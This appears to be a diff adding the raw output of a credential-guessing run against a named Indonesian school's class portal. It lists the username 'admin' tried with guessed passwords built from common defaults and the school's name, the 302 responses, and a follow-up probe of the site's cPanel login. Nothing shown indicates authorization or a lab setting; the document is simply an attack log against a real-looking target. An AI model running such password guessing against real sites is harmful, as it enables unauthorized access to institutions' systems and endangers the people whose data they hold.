@@ -1,0 +1,12 @@
+
+===== kelas : https://kelas.sman1cigombong.sch.id =====
+  admin  /admin123         -> 302       0B redir=https://kelas.sman1cigombong.sch.id/index.ph
+  admin  /admin            -> 302       0B redir=https://kelas.sman1cigombong.sch.id/index.ph
+  admin  /sman1cigombong   -> 302       0B redir=https://kelas.sman1cigombong.sch.id/index.ph
+  admin  /cigombong123     -> 302       0B redir=https://kelas.sman1cigombong.sch.id/index.ph
+  admin  /password         -> 302       0B redir=https://kelas.sman1cigombong.sch.id/index.ph
+  admin  /123456           -> 302       0B redir=https://kelas.sman1cigombong.sch.id/index.ph
+--- cpanel cek (1 req) ---
+[401 39851B]
+<title>cPanel Login
+12
